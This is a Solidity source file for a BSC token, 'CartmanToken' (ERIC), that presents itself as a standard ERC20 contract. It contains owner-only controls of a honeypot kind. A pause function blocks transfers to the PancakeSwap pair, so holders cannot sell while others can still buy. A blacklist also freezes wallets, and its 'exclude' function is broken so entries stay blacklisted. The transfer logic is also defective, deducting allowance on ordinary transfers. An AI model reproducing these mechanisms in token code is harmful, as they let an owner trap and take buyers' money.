/**
 *Submitted for verification at BscScan.com on 2021-09-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address tokenOwner) external view returns (uint balance);

    function allowance(address tokenOwner, address spender) external view returns (uint remaining);

    function transfer(address to, uint tokens) external returns (bool success);

    function approve(address spender, uint tokens) external returns (bool success);

    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
}

abstract contract ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public virtual;
}

interface IPancakeV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IPancakeV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Cartman is IERC20 {
    using SafeMath for uint256;
    using SafeMath for uint;

    address private _owner;
    string public symbol = "ERIC";
    string public name = "CartmanToken";
    uint8 public decimals = 9;
    uint _totalSupply = 1000000000 * 10 ** 6 * 10 ** 9;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => bool) private _blackListWallet;
    bool private isPause = false;
    address private _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private pancakeV2Pair;

    constructor() {
        _owner = msg.sender;
        balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    modifier canTransfer(address sender, address recipient) {
        require(!_blackListWallet[sender], "Blacklisted Wallet");

        if (pancakeV2Pair == address(0)) {
            IPancakeV2Router02 _pancakeV2Router = IPancakeV2Router02(_pancakeRouterAddress);
            pancakeV2Pair = IPancakeV2Factory(_pancakeV2Router.factory())
            .getPair(address(this), _pancakeV2Router.WETH());
        }

        if (pancakeV2Pair != address(0) && recipient == pancakeV2Pair)
            require(!isPause, "Contract already is Pause");
        _;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply.sub(balances[address(0)]);
    }

    function balanceOf(address tokenOwner) public view override returns (uint balance) {
        return balances[tokenOwner];
    }

    function transfer(address recipient, uint256 amount) public canTransfer(msg.sender, recipient) override returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public canTransfer(sender, recipient) override returns (bool) {
        return _transfer(sender, recipient, amount);
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function allowance(address tokenOwner, address spender) public view override returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
        return true;
    }

    function _transfer(address from, address to, uint tokens) private returns (bool){
        balances[from] = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function includeBlacklistWallet(address _address) external onlyOwner {
        require(!_blackListWallet[_address], "Wallet is already included blacklist");
        _blackListWallet[_address] = true;
    }

    function excludeBlacklistWallet(address _address) external onlyOwner {
        require(_blackListWallet[_address], "Wallet is already excluded blacklist");
        _blackListWallet[_address] = true;
    }

    function pauseContact() external onlyOwner {
        require(!isPause, "Contact is already pause");
        isPause = true;
    }

    function unpauseContact() external onlyOwner {
        require(isPause, "Contact is already unpause");
        isPause = false;
    }

    function isBlacklistedWallet(address _address) external onlyOwner view returns (bool) {
        return _blackListWallet[_address];
    }

    function contactIsPause() external onlyOwner view returns (bool) {
        return isPause;
    }

    receive() external payable {}
}